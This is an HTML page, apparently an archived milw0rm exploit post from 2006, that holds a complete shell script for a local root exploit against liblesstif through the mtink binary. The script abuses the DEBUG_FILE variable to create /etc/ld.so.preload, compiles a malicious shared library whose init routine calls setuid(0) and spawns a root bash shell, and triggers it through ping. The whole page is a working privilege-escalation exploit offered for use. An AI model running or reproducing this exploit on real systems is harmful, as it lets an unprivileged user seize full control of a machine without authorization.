<html><head><title>liblesstif <= 2-0.93.94-4mdk (DEBUG_FILE) Local Root Exploit</title></head><pre>#!/bin/sh
echo
echo &quot;mtink libXm local root exploit&quot;
echo &quot;* karol@wiesek.pl *&quot;
echo
umask 000
export DEBUG_FILE=&quot;/etc/ld.so.preload&quot;
cat &gt; /tmp/lib.c &lt;&lt; _EOF
#include &lt;unistd.h&gt;
void _init(void)
{
	if (getuid()!=0 &amp;&amp; geteuid()==0)
	{
		setuid(0);
		unlink(&quot;/etc/ld.so.preload&quot;);
		execl(&quot;/bin/bash&quot;, &quot;bash&quot;, 0);
	}
}
_EOF
/usr/bin/gcc -o /tmp/lib.o -c /tmp/lib.c
/usr/bin/ld -shared -o /tmp/lib.so /tmp/lib.o
/usr/bin/mtink
echo &quot;/tmp/lib.so&quot; &gt; /etc/ld.so.preload
/bin/ping

# milw0rm.com [2006-08-08]</pre></html>